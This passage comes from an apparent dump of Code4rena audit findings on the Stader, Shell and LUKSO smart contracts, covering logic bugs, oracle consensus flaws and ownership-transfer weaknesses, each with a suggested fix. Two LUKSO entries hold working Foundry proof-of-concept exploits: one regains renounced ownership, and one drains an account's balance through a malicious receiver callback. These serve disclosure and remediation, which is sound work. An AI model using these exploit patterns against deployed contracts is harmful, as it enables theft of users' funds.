INodeRegistry(IStaderPoolBase(_poolAddress).getNodeRegistry()).POOL_ID() != _poolId ||         isExistingPoolId(_poolId)     ) {         revert ExistingOrMismatchingPoolId();     } } ```  It's clear that The function reverts when the poolId already exists meaning `isExistingPoolId(_poolId) == true`.  So to summarize the `updatePoolAddress` function reverts when the poolId does not exists and the `verifyNewPool` function reverts when the poolId exists, the two functions work on opposite conditions which means that when the `verifyNewPool` function is called inside the `updatePoolAddress` function it will automatically revert and hence the pool address of already existing poolId can never be updated.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Remove the `verifyNewPool` call inside the `updatePoolAddress` function and replace it with the following :  ```solidity function updatePoolAddress(     uint8 _poolId,     address _newPoolAddress ) external override onlyExistingPoolId(_poolId) onlyRole(DEFAULT_ADMIN_ROLE) {     UtilLib.checkNonZeroAddress(_newPoolAddress);     // @audit revert only when mismatch in poolId     if (INodeRegistry(IStaderPoolBase(_poolAddress).getNodeRegistry()).POOL_ID() != _poolId) {         revert MismatchingPoolId();     }     poolAddressById[_poolId] = _newPoolAddress;     emit PoolAddressUpdated(_poolId, _newPoolAddress); } ```   ## Assessed type  Error"}, {"title": "StaderOracle - Strict equal can cause no consensus if trusted nodes are removed before consensus ", "html_url": "https://github.com/code-423n4/2023-06-stader-findings/issues/321", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-05"], "target": "2023-06-stader-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-stader/blob/main/contracts/StaderOracle.sol#L148 https://github.com/code-423n4/2023-06-stader/blob/main/contracts/StaderOracle.sol#L290   # Vulnerability details  ## Impact ```         if (             submissionCount == trustedNodesCount / 2 + 1 &&             _exchangeRate.reportingBlockNumber > exchangeRate.reportingBlockNumber         ) {             updateWithInLimitER(                 _exchangeRate.totalETHBalance,                 _exchangeRate.totalETHXSupply,                 _exchangeRate.reportingBlockNumber             );         } ``` In `submitExchangeRateData`, consensus is reached if `submissionCount` is strictly equal to desired number. However, trustNodesCount can be decreased and this condition can be never met.  ```         if ((submissionCount == (2 * trustedNodesCount) / 3 + 1)) {             lastReportedSDPriceData = _sdPriceData;             lastReportedSDPriceData.sdPriceInETH = getMedianValue(sdPrices);             delete sdPrices;  ``` In `submitSDPrice`, if this case happens, `sdPrices` doesn't get deleted and it will affect the next submission batch's price.  ## Proof of Concept In the above snippet, let's assume trustedNodesCount = 10, submissionCount = 5. The condition doesn't meet for now (5 != 10/2+1). Then trustedNodesCount decreases to 9. Next time when a node submits, trustedNodesCount = 9, submissionCount = 6. Then the condition cannot be met since 6 != 9/2+1.  ## Tools Used Manual  ## Recommended Mitigation Steps Replace strict equal with equal or greater than. Or replace it with greater than and decrease the right side.  Not sure about adding cooldown for add/remove trusted nodes.       ## Assessed type  Other"}, {"title": "Corruption of oracle data", "html_url": "https://github.com/code-423n4/2023-06-stader-findings/issues/202", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-06-stader-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-stader/blob/main/contracts/StaderOracle.sol#L270 https://github.com/code-423n4/2023-06-stader/blob/main/contracts/StaderOracle.sol#L285   # Vulnerability details  ## Impact Corruption of oracle data  ## Proof of Concept Block for lastReportedSDPriceData = 7200 Let current block = 21601 Now StaderOracle will have data for 14400 and 21600 both blocks being pushed by nodes and in prices array  it will be all mixed up. Also, As soon as 14400 block is finalised data for block 21600 is all lost as well.  ## Tools Used  ## Recommended Mitigation Steps add ```if (_sdPriceData.reportingBlockNumber == getSDPriceReportableBlock()) ``` to ensure it is always latest reportable block data add ```mapping(uint256 => uint256[]) blockPrices``` to store prices array separately for each block being reported to avoid mixing and corruption of data or have ```uint256 currentEpochBlock``` so that when new block data is pushed, previous data is deleting before pushing new data ``` if(_sdPriceData.reportingBlockNumber!=currentEpochBlock){    delete prices; }     ## Assessed type  Oracle"}, {"title": "depositETHOverTargetWeight() malicious modifications poolIdArrayIndexForExcessDeposit", "html_url": "https://github.com/code-423n4/2023-06-stader-findings/issues/175", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-06-stader-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/StaderStakePoolsManager.sol#L229   # Vulnerability details  ## Impact Malicious modification in favor of your own funds allocation rounds  ## Proof of Concept `poolIdArrayIndexForExcessDeposit` is used to save `depositETHOverTargetWeight()` which `Pool` is given priority for allocation in the next round  The current implementation rolls over to the next `pool` regardless of whether the current balance is sufficient or not  poolAllocationForExcessETHDeposit: ```solidity     function poolAllocationForExcessETHDeposit(uint256 _excessETHAmount)         external         override         returns (uint256[] memory selectedPoolCapacity, uint8[] memory poolIdArray)     { ..         for (uint256 j; j < poolCount; ) {             uint256 poolCapacity = poolUtils.getQueuedValidatorCountByPool(poolIdArray[i]);             uint256 poolDepositSize = ETH_PER_NODE - poolUtils.getCollateralETH(poolIdArray[i]);             uint256 remainingValidatorsToDeposit = ethToDeposit / poolDepositSize;             selectedPoolCapacity[i] = Math.min(                 poolAllocationMaxSize - selectedValidatorCount,                 Math.min(poolCapacity, remainingValidatorsToDeposit)             );             selectedValidatorCount += selectedPoolCapacity[i];             ethToDeposit -= selectedPoolCapacity[i] * poolDepositSize; @>          i = (i + 1) % poolCount;             //For ethToDeposit < ETH_PER_NODE, we will be able to at best deposit one more validator             //but that will introduce complex logic, hence we are not solving that @>          if (ethToDeposit < ETH_PER_NODE || selectedValidatorCount >= poolAllocationMaxSize) { @>              poolIdArrayIndexForExcessDeposit = i;                 break;             }     ```  Suppose now the balance of `StaderStakePoolsManager` is 0 and poolIdArrayIndexForExcessDeposit = 1  If I have a `Validator` with funds to be allocated at pool = 2, I can maliciously transfer 1 wei and let `poolIdArrayIndexForExcessDeposit` roll over to 2  This way the next round of funding will be allocated in favor of my `Validator`.  Normally, if the current funds are not enough to allocate one `Validator`, then `poolIdArrayIndexForExcessDeposit` should not be rolled This is more fair  Suggested: If `poolAllocationForExcessETHDeposit()` returns all 0, revert to avoid rolling `poolIdArrayIndexForExcessDeposit`.  ## Tools Used  ## Recommended Mitigation Steps  ```solidity     function depositETHOverTargetWeight() external override nonReentrant { ..  +       bool findValidator;         for (uint256 i = 0; i < poolCount; i++) {             uint256 validatorToDeposit = selectedPoolCapacity[i];             if (validatorToDeposit == 0) {                 continue;             } +           findValidator = true;             address poolAddress = IPoolUtils(poolUtils).poolAddressById(poolIdArray[i]);             uint256 poolDepositSize = staderConfig.getStakedEthPerNode() -                 IPoolUtils(poolUtils).getCollateralETH(poolIdArray[i]);              lastExcessETHDepositBlock = block.number;             //slither-disable-next-line arbitrary-send-eth             IStaderPoolBase(poolAddress).stakeUserETHToBeaconChain{value: validatorToDeposit * poolDepositSize}();             emit ETHTransferredToPool(i, poolAddress, validatorToDeposit * poolDepositSize);         }  +       require(findValidator,\"not valid validator\");      ```   ## Assessed type  Context"}, {"title": "`_checkBalances` FUNCTION BREAKS THE EXPECTED BEHAVIOUR OF THE PROTOCOL DUE TO ERRORNEOUS CONDITIONAL CHECK", "html_url": "https://github.com/code-423n4/2023-08-shell-findings/issues/204", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "sufficient quality report"], "target": "2023-08-shell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-shell/blob/main/src/proteus/EvolvingProteus.sol#L812-L813 https://github.com/code-423n4/2023-08-shell/blob/main/src/proteus/EvolvingProteus.sol#L155-L157 https://github.com/code-423n4/2023-08-shell/blob/main/src/proteus/EvolvingProteus.sol#L149-L151   # Vulnerability details  ## Impact  The `EvolvingProteus._checkBalances` function is used to verify the token reserve balances and the token reserve ratio are with in the valid boundaries of the pool. To validate the `reserve ratio` is within the valid range of `MIN_M - MAX_M` the following checks are performed.          if (finalBalanceRatio < MIN_M) revert BoundaryError(x,y);         else if (MAX_M <= finalBalanceRatio) revert BoundaryError(x,y);  The `NATSPEC` comments for the `MIN_M` and `MAX_M` are given as follows:      MIN_M -> This limits the pool to having at most 10**8 x for each y     MAX_M -> This limits the pool to having at most 10**8 y for each x  Even though the documentation says the `y / x` ratio can have at most 10**8 the logic implementation reverts when the `y / x == 10**8` as shown below:          else if (MAX_M <= finalBalanceRatio) revert BoundaryError(x,y);  But it is not the case with the `MIN_M`. Because the transaction will not revert when `y / x == 1 / 10**8`.  Hence there is a discrepancy between the documentation and the logic implementation.  Consider a scenario where the `y balance = 200 * 10**20` and `x balance = 200 * 10**12`. Now the `y / x = 10**8`. The transaction is not expected to be reverted since the documentation mentions that the pool is allowed to have at most 10**8 y for each x. But according to the logic implementation this transaction will revert since `MAX_M == finalBalanceRatio`. This breaks the expected behaviour of the protocol.   ## Proof of Concept  ```solidity         if (finalBalanceRatio < MIN_M) revert BoundaryError(x,y);         else if (MAX_M <= finalBalanceRatio) revert BoundaryError(x,y); ```  https://github.com/code-423n4/2023-08-shell/blob/main/src/proteus/EvolvingProteus.sol#L812-L813  ```solidity      This limits the pool to having at most 10**8 y for each x.     */      int128 constant MAX_M = 0x5f5e1000000000000000000; ```  https://github.com/code-423n4/2023-08-shell/blob/main/src/proteus/EvolvingProteus.sol#L155-L157  ```solidity      When a token has 18 decimals, this is one microtoken     */      int256 constant MIN_BALANCE = 10**12; ```  https://github.com/code-423n4/2023-08-shell/blob/main/src/proteus/EvolvingProteus.sol#L149-L151  ## Tools Used VSCode and Manual Review  ## Recommended Mitigation Steps  Hence it is recommended to modify the `MAX_M <= finalBalanceRatio` conditional check of the `_checkBalances` function as shown below (omit the equality check in it):          else if (MAX_M < finalBalanceRatio) revert BoundaryError(x,y);   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-08-shell-findings/issues/135", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-11"], "target": "2023-08-shell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-shell-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/141", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-06-lukso-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lukso-findings/blob/main/data/MiloTruck-Q.md)."}, {"title": "The owner of a `LSP0ERC725Account` can become the owner again after renouncing ownership", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/124", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-06-lukso-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP14Ownable2Step/LSP14Ownable2Step.sol#L176-L178   # Vulnerability details  ## Bug Description  The `renounceOwnership()` function allows the owner of a `LSP0ERC725Account` to renounce ownership through a two-step process. When `renounceOwnership()` is first called, `_renounceOwnershipStartedAt` is set to `block.number` to indicate that the process has started:  [LSP14Ownable2Step.sol#L159-L167](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP14Ownable2Step/LSP14Ownable2Step.sol#L159-L167)  ```solidity         if (             currentBlock > confirmationPeriodEnd ||             _renounceOwnershipStartedAt == 0         ) {             _renounceOwnershipStartedAt = currentBlock;             delete _pendingOwner;             emit RenounceOwnershipStarted();             return;         } ```  When `renounceOwnership()` is called again, the owner is then set to `address(0)`:  [LSP14Ownable2Step.sol#L176-L178](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP14Ownable2Step/LSP14Ownable2Step.sol#L176-L178)  ```solidity         _setOwner(address(0));         delete _renounceOwnershipStartedAt;         emit OwnershipRenounced(); ```  However, as `_pendingOwner` is only deleted in the first call to `renounceOwnership()`, an owner could regain ownership of the account after the second call to `renounceOwnership()` by doing the following:  1. Call `renounceOwnership()` for the first time to initiate the process. 1. Using `execute()`, perform a delegate call that overwrites `_pendingOwner` to his own address. 1. Call `renounceOwnership()` again to set the owner to `address(0)`.   As `_pendingOwner` is still set to the owner's address, he can call `acceptOwnership()` at anytime to regain ownership of the account.  ## Impact  Even after the `renounceOwnership()` process is completed, an owner might still be able to regain ownership of an LSP0 account.   This could potentially be dangerous if users assume that an LSP0 account will never be able to call restricted functions after ownership is renounced, as stated in [the following comment](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP0ERC725Account/LSP0ERC725AccountCore.sol#L652):  > Leaves the contract without an owner. Once ownership of the contract has been renounced, any functions that are restricted to be called by the owner will be permanently inaccessible, making these functions not callable anymore and unusable.  For example, if a protocol's admin is set to a `LSP0ERC725Account`, the owner could gain the community's trust by renouncing ownership. After the protocol has gained a significant TVL, the owner could then regain ownership of the account and proceed to rug the protocol.    ## Proof of Concept  The following Foundry test demonstrates how an owner can regain ownership of a `LSP0ERC725Account` after `renounceOwnership()` has been called twice:  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import \"../../contracts/LSP0ERC725Account/LSP0ERC725Account.sol\";  contract Implementation {     // _pendingOwner is at slot 3 for LSP0ERC725Account     bytes32[3] __gap;     address _pendingOwner;       function setPendingOwner(address newPendingOwner) external {         _pendingOwner = newPendingOwner;     } }  contract RenounceOwnership_POC is Test {     LSP0ERC725Account account;      function setUp() public {         // Deploy LSP0 account with this address as owner         account = new LSP0ERC725Account(address(this));     }      function testCanRegainOwnership() public {         // Call renounceOwnership() to initiate the process         account.renounceOwnership();          // Overwrite _pendingOwner using a delegatecall         Implementation implementation = new Implementation();         account.execute(             4, // OPERATION_4_DELEGATECALL             address(implementation),             0,             abi.encodeWithSelector(Implementation.setPendingOwner.selector, address(this))         );          // _pendingOwner is now set to this address         assertEq(account.pendingOwner(), address(this));          // Call renounceOwnership() again to renounce ownership         vm.roll(block.number + 200);         account.renounceOwnership();          // Owner is now set to address(0)         assertEq(account.owner(), address(0));          // Call acceptOwnership() to regain ownership         account.acceptOwnership();                  // Owner is now set to address(this) again         assertEq(account.owner(), address(this));     } } ```  ## Recommended Mitigation  Consider deleting `_pendingOwner` when `renounceOwnership()` is called for a second time as well:  [LSP14Ownable2Step.sol#L176-L178](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP14Ownable2Step/LSP14Ownable2Step.sol#L176-L178)  ```diff         _setOwner(address(0));         delete _renounceOwnershipStartedAt; +       delete _pendingOwner;         emit OwnershipRenounced(); ```   ## Assessed type  call/delegatecall"}, {"title": "Two-step ownership transfer process in `LSP0ERC725AccountCore` can be bypassed", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/123", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-06-lukso-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP0ERC725Account/LSP0ERC725AccountCore.sol#L560-L580   # Vulnerability details  ## Bug Description  To transfer ownership of the `LSP0ERC725AccountCore` contract, the owner has to call `transferOwnership()` to nominate a pending owner. Afterwards, the pending owner must call `acceptOwnership()` to become the new owner.  When called by the owner, `transferOwnership()` executes the following logic:  [LSP0ERC725AccountCore.sol#L560-L580](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP0ERC725Account/LSP0ERC725AccountCore.sol#L560-L580)  ```solidity         address currentOwner = owner();          // If the caller is the owner perform transferOwnership directly         if (msg.sender == currentOwner) {             // set the pending owner             LSP14Ownable2Step._transferOwnership(pendingNewOwner);             emit OwnershipTransferStarted(currentOwner, pendingNewOwner);              // notify the pending owner through LSP1             pendingNewOwner.tryNotifyUniversalReceiver(                 _TYPEID_LSP0_OwnershipTransferStarted,                 \"\"             );              // Require that the owner didn't change after the LSP1 Call             // (Pending owner didn't automate the acceptOwnership call through LSP1)             require(                 currentOwner == owner(),                 \"LSP14: newOwner MUST accept ownership in a separate transaction\"             );         } else { ```  The `currentOwner == owner()` check ensures that `pendingNewOwner` did not call `acceptOwnership()` in the `universalReceiver()` callback. However, a malicious contract can bypass this check by doing the following in its `universalReceiver()` function:  * Call `acceptOwnership()` to gain ownership of the LSP0 account. * Do whatever he wants, such as transferring the account's entire LYX balance to himself.  * Call `execute()` to perform a delegate call that does either of the following:   * Delegate call into a contract that self-destructs, which will destroy the account permanently.   * Otherwise, use delegate call to overwrite `_owner` to the previous owner.    This defeats the entire purpose of a two-step ownership transfer, which should ensure that the LSP0 account cannot be lost in a single call if the owner accidentally calls `transferOwnership()` with the wrong address.  ## Impact  Should `transferOwnership()` be called with the wrong address, the address could potentially bypass the two-step ownership transfer process to destroy the LSP0 account in a single transaction.  ## Proof of Concept  The following Foundry test demonstrates how an attacker can drain the LYX balance of an LSP0 account in a single transaction when set to the pending owner in `transferOwnership()`:  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import \"../../../contracts/LSP0ERC725Account/LSP0ERC725Account.sol\";  contract Implementation {     // _owner is at slot 0 for LSP0ERC725Account     address _owner;       function setOwner(address newOwner) external {         _owner = newOwner;     } }  contract MaliciousReceiver {      LSP0ERC725Account account;     bool universalReceiverDisabled;          constructor(LSP0ERC725Account _account) {         account = _account;     }      function universalReceiver(bytes32, bytes calldata) external returns (bytes memory) {         // Disable universalReceiver()          universalReceiverDisabled = true;          // Cache owner for later use         address owner = account.owner();          // Call acceptOwnership() to become the owner         account.acceptOwnership();          // Transfer all LYX balance to this contract         account.execute(             0, // OPERATION_0_CALL             address(this),             10 ether,             \"\"         );          // Overwrite _owner with the previous owner using delegatecall         Implementation implementation = new Implementation();         account.execute(             4, // OPERATION_4_DELEGATECALL             address(implementation),             0,             abi.encodeWithSelector(Implementation.setOwner.selector, owner)         );          return \"\";     }      function supportsInterface(bytes4) external view returns (bool) {         return !universalReceiverDisabled;     }      receive() payable external {} }  contract TwoStepOwnership_POC is Test {     LSP0ERC725Account account;      function setUp() public {         // Deploy LSP0 account with address(this) as owner and give it some LYX         account = new LSP0ERC725Account(address(this));         deal(address(account), 10 ether);     }      function testCanDrainContractInTransferOwnership() public {         // Attacker deploys malicious receiver contract         MaliciousReceiver maliciousReceiver = new MaliciousReceiver(account);          // Victim calls transferOwnership() for malicious receiver         account.transferOwnership(address(maliciousReceiver));          // All LYX in the account has been drained         assertEq(address(account).balance, 0);         assertEq(address(maliciousReceiver).balance, 10 ether);     } } ```  ## Recommended Mitigation  Add a `inTransferOwnership` state variable, which ensures that `acceptOwnership()` cannot be called while `transferOwnership()` is in execution, similar to a reentrancy guard:  ```solidity function transferOwnership(     address pendingNewOwner ) public virtual override(LSP14Ownable2Step, OwnableUnset) {     inTransferOwnership = true;      // Some code here...      inTransferOwnership = false; }  function acceptOwnership() public virtual override {     if (inTransferOwnership) revert CannotAcceptOwnershipDuringTransfer();      // Some code here... } ```   ## Assessed type  call/delegatecall"}, {"title": "`LSP8Burnable` extension incorrectly inherits `LSP8IdentifiableDigitalAssetCore`", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/120", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-06-lukso-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8Burnable.sol#L15   # Vulnerability details  ## Bug Description  The `LSP8Burnable` contract inherits from `LSP8IdentifiableDigitalAssetCore`:  [LSP8Burnable.sol#L15](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8Burnable.sol#L15)  ```solidity abstract contract LSP8Burnable is LSP8IdentifiableDigitalAssetCore { ```  However, LSP8 extensions are supposed to inherit `LSP8IdentifiableDigitalAsset` instead. This can be inferred by looking at [`LSP8CappedSupply.sol`](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8CappedSupply.sol), [`LSP8CompatibleERC721.sol`](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8CompatibleERC721.sol) and [`LSP8Enumerable.sol`](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8Enumerable.sol):  [LSP8CappedSupply.sol#L13](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8CappedSupply.sol#L13)  ```solidity abstract contract LSP8CappedSupply is LSP8IdentifiableDigitalAsset { ```  Additionally, the `LSP8BurnableInitAbstract.sol` file is missing in the repository.  ## Impact  As `LSP8Burnable` does not inherit `LSP8IdentifiableDigitalAsset`, a developer who implements his LSP8 token using `LSP8Burnable` will face the following issues:  * All functionality from `LSP4DigitalAssetMetadata` will be unavailable. * As `LSP8Burnable` does not contain a `supportsInterface()` function, it will be incompatible with contracts that use [ERC-165](https://eips.ethereum.org/EIPS/eip-165).  ## Recommended Mitigation  The `LSP8Burnable` contract should inherit `LSP8IdentifiableDigitalAsset` instead:  [LSP8Burnable.sol#L15](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8Burnable.sol#L15)  ```diff -   abstract contract LSP8Burnable is LSP8IdentifiableDigitalAssetCore { +   abstract contract LSP8Burnable is LSP8IdentifiableDigitalAsset { ```  Secondly, add a `LSP8BurnableInitAbstract.sol` file that contains an implementation of `LSP8Burnable` which can be used in proxies.   ## Assessed type  Other"}, {"title": "`LSP8CompatibleERC721`'s `approve()` deviates from ERC-721 specification", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/118", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-05"], "target": "2023-06-lukso-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8CompatibleERC721.sol#L155-L158   # Vulnerability details  ## Bug Description  The `LSP8CompatibleERC721` contract is a wrapper around LSP8 that is meant to function similarly to ERC-721 tokens. One of its implemented functions is ERC-721's `approve()`:  [LSP8CompatibleERC721.sol#L155-L158](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/extensions/LSP8CompatibleERC721.sol#L155-L158)  ```solidity     function approve(address operator, uint256 tokenId) public virtual {         authorizeOperator(operator, bytes32(tokenId));         emit Approval(tokenOwnerOf(bytes32(tokenId)), operator, tokenId);     } ```  As `approve()` calls `authorizeOperator()` from the `LSP8IdentifiableDigitalAssetCore` contract, only the owner of `tokenId` is allowed to call `approve()`:  [LSP8IdentifiableDigitalAssetCore.sol#L105-L113](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP8IdentifiableDigitalAsset/LSP8IdentifiableDigitalAssetCore.sol#L105-L113)  ```solidity     function authorizeOperator(         address operator,         bytes32 tokenId     ) public virtual {         address tokenOwner = tokenOwnerOf(tokenId);          if (tokenOwner != msg.sender) {             revert LSP8NotTokenOwner(tokenOwner, tokenId, msg.sender);         } ```  However, the implementation above deviates from the [ERC-721 specification](https://eips.ethereum.org/EIPS/eip-721), which mentions that an \"authorized operator of the current owner\" should also be able to call `approve()`:  ```solidity     /// @notice Change or reaffirm the approved address for an NFT     /// @dev The zero address indicates there is no approved address.     ///  Throws unless `msg.sender` is the current NFT owner, or an authorized     ///  operator of the current owner.     /// @param _approved The new approved NFT controller     /// @param _tokenId The NFT to approve     function approve(address _approved, uint256 _tokenId) external payable; ```  This means that anyone who is an approved operator for `tokenId`'s owner through `setApprovalForAll()` should also be able to grant approvals. An example of such behaviour can be seen in [Openzeppelin's ERC721 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol):  [ERC721.sol#L121-L123](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L121-L123)  ```solidity         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {             revert ERC721InvalidApprover(_msgSender());         } ```  ## Impact  As `LSP8CompatibleERC721`'s `approve()` functions differently from ERC-721, protocols that rely on this functionality will be incompatible with LSP8 tokens that inherit from `LSP8CompatibleERC721`.   For example, in an NFT exchange, users might be required to call `setApprovalForAll()` for the protocol's router contract. The router then approves a swap contract, which transfers the NFT from the user to the recipient using `transferFrom()`.  Additionally, developers that expect `LSP8CompatibleERC721` to behave exactly like ERC-721 tokens might introduce bugs in their contracts due to the difference in `approve()`.    ## Recommended Mitigation  Modify `approve()` to allow approved operators for `tokenId`'s owner to grant approvals:  ```solidity function approve(address operator, uint256 tokenId) public virtual {      bytes32 tokenIdBytes = bytes32(tokenId);     address tokenOwner = tokenOwnerOf(tokenIdBytes);      if (tokenOwner != msg.sender && !isApprovedForAll(tokenOwner, msg.sender)) {         revert LSP8NotTokenOwner(tokenOwner, tokenIdBytes, msg.sender);     }      if (operator == address(0)) {         revert LSP8CannotUseAddressZeroAsOperator();     }      if (tokenOwner == operator) {         revert LSP8TokenOwnerCannotBeOperator();     }      bool isAdded = _operators[tokenIdBytes].add(operator);     if (!isAdded) revert LSP8OperatorAlreadyAuthorized(operator, tokenIdBytes);      emit AuthorizedOperator(operator, tokenOwner, tokenIdBytes);     emit Approval(tokenOwner, operator, tokenId); } ```      ## Assessed type  ERC721"}, {"title": "Universal Data Key Permissions May Be Abused During Ownership Transfers", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/98", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-06-lukso-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lukso/blob/9dbc96410b3052fc0fd9d423249d1fa42958cae8/contracts/LSP6KeyManager/LSP6KeyManagerCore.sol#L132-L137 https://github.com/code-423n4/2023-06-lukso/blob/9dbc96410b3052fc0fd9d423249d1fa42958cae8/contracts/LSP6KeyManager/LSP6KeyManagerCore.sol#L282-L288 https://github.com/code-423n4/2023-06-lukso/blob/9dbc96410b3052fc0fd9d423249d1fa42958cae8/contracts/LSP6KeyManager/LSP6KeyManagerCore.sol#L462   # Vulnerability details  ## Impact In LSP6KeyManager, when fetching permissions. we are looking for universal permissions (independent from the owner). If a UP owner transfers ownership to a new owner that uses a key manager, the previously set permissions (like access for a lot controller) remain intact. This can potentially enable the old owner to retain significant control over the UP, which could be abused to destabilize the contract or cause financial harm to the new owner and other participants.  ## Proof of Concept The problem arises from the inability of the smart contract to identify and manage data keys that were set by previous owners. A malicious actor could set certain permissions while they are the owner of the UP, then transfer the ownership to a new owner. The old permissions would remain in effect, allowing the old owner to maintain undue control and possibly 'rug pull' or cause other harmful actions at a later date.  ## Tools Used The issue was identified through manual review of the contract mechanisms and their potential abuse, without the use of specific security tools.   ## Recommended Mitigation Steps To prevent potential abuse through residual permissions, the data keys for permissions should be made owner-specific. The following mitigation steps can be implemented:  - Hash the permission with the owner's address: When setting permissions, they can be hashed with the owner's address. This way, the permissions are specifically associated with a particular owner and do not affect subsequent owners.  - Add a nonce upon ownership transfer: To further ensure the uniqueness and irrelevance of old permissions, a random nonce can be added each time the ownership is transferred. This nonce can be used in conjunction with the address of the LSP6 when retrieving permissions, making any permissions set by old owners irrelevant.    ## Assessed type  Rug-Pull"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/90", "labels": ["analysis-advanced", "grade-a", "high quality report", "satisfactory", "selected for report", "sponsor confirmed", "A-01"], "target": "2023-06-lukso-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lukso-findings/blob/main/data/K42-Analysis.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "selected for report", "sponsor confirmed", "G-07"], "target": "2023-06-lukso-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lukso-findings/blob/main/data/Raihan-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/61", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "edited-by-warden", "G-10"], "target": "2023-06-lukso-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lukso-findings/blob/main/data/Sathish9098-G.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/27", "labels": ["analysis-advanced", "grade-b", "satisfactory", "sponsor confirmed", "A-02"], "target": "2023-06-lukso-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lukso-findings/blob/main/data/catellatech-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/16", "labels": ["analysis-advanced", "grade-a", "high quality report", "satisfactory", "sponsor confirmed", "A-03"], "target": "2023-06-lukso-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lukso-findings/blob/main/data/gpersoon-Analysis.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lukso-findings/issues/15", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-09"], "target": "2023-06-lukso-findings", "body": "See the markdown file with the details of this report 